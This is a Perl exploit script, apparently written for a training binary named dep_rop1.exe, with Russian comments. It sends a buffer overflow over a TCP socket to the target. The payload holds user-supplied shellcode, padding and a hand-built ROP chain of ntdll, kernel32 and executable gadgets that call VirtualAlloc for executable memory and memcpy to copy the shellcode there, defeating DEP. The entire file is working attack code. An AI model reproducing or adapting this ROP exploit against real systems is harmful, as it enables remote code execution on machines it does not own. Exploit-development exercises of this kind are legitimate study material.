#!/usr/bin/perl -w

# Эксплоит для программы dep_rop1.exe
# 28.10.2016

use IO::Socket;

my $host = shift @ARGV;
my $port = shift @ARGV;
my $sc_file = shift @ARGV;

my $sock = IO::Socket::INET->new ("$host:$port") or die $@;
$sock->autoflush(1);

my $sc = `cat $sc_file`;
my $sc_len = length ($sc);


my $base_exe = 0x08040000;
my $base_kernel32 = 0x7c800000;
my $base_ntdll = 0x7c900000;
#my $base_advapi = 0x00;


my $pop_ecx = $base_exe + 0x1494;
my $pop_esi = $base_exe + 0x1758;
my $pop_edi_esi_ebx_ebp = $base_exe + 0x181f;
my $pop_edx = $base_ntdll + 0x13c3;
my $pop_eax = $base_kernel32 + 0x105df0;
my $pop_ebp = $base_exe + 0x18eb;
my $pop_edi = $base_ntdll + 0x28CB;

# MOV DWORD PTR DS:[EDX],EAX # MOV EAX,3 # RETN 0x10    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
my $mov_memedx_eax = $base_ntdll + 0x3821;

# адрес для сохранения eax
my $save_addr = $base_exe + 0x40E0;

my $ret = $base_exe + 0x10E8;

my $rop_save_addr = pack ("L", $pop_edx) . pack ("L", $save_addr) . pack ("L", $mov_memedx_eax) . pack ("L", $ret) . "A"x(0x10);


# MOV EAX,DWORD PTR DS:[EAX+34] # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
my $mov_eax_mem_eax34 = $base_ntdll + 0x10337;

# push eax # ret
my $push_eax_ret = $base_ntdll + 0x1A1C;


my $iat_virtual_alloc = $base_exe + 0x51d8;
my $iat_memcpy = $base_exe + 0x52A0;

my $size_sc = 0x1000;
my $allocation_type = 0x3000;
my $protect_rwx = 0x40;

my $addr_for_copy_sc = 0x66660000;


my $rop_virtual_alloc = pack ("L", $pop_eax) . pack ("L", $iat_virtual_alloc - 0x34) . pack ("L", $mov_eax_mem_eax34) .
pack ("L", $push_eax_ret) . pack ("L", $ret) . pack ("L", $addr_for_copy_sc) . pack ("L", $size_sc) . pack ("L", $allocation_type) . pack ("L", $protect_rwx);


# pushad # ret
# pushad: АХ/ЕАХ, СХ/ЕСХ, DX/EDX, ВХ/ЕВХ, SP/ESP, BP/EBP, SI/ESI, DI/EDI 
my $pushad_ret = $base_ntdll + 0x2751b;

# MOV EBX,DWORD PTR SS:[EBP-30] # NOP # NOP # NOP # NOP # NOP # MOV BYTE PTR DS:[ESI+45],0 # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
my $mov_ebx_ebp30 = $base_ntdll + 0x531a5;

# retn 8
my $ret8 = $base_ntdll + 0x11F2;

# edi = retn 8
# esi = ret
# ebx = memcpy
# edx = ret_addr = addr_for_copy_sc
# ecx = addr_for_copy_sc
# eax = sc = *save_addr
my $rop_memcpy = 
pack ("L", $pop_ebp) . pack ("L", $iat_memcpy + 0x30) . pack ("L", $pop_esi) . pack ("L", $save_addr) . pack ("L", $mov_ebx_ebp30) .
pack ("L", $pop_eax) . pack ("L", $save_addr - 0x34) . pack ("L", $mov_eax_mem_eax34) .
pack ("L", $pop_edi) . pack ("L", $ret8) .
pack ("L", $pop_esi) . pack ("L", $ret) .
pack ("L", $pop_edx) . pack ("L", $addr_for_copy_sc) .
pack ("L", $pop_ecx) . pack ("L", $addr_for_copy_sc) .
pack ("L", $pushad_ret) . pack ("L", $size_sc);





my $rop = $rop_save_addr . $rop_virtual_alloc . $rop_memcpy;
my $data = $sc . "A"x(1004-$sc_len) . "\xf3" . $rop . "\n";
print $sock $data;

$sock->close();
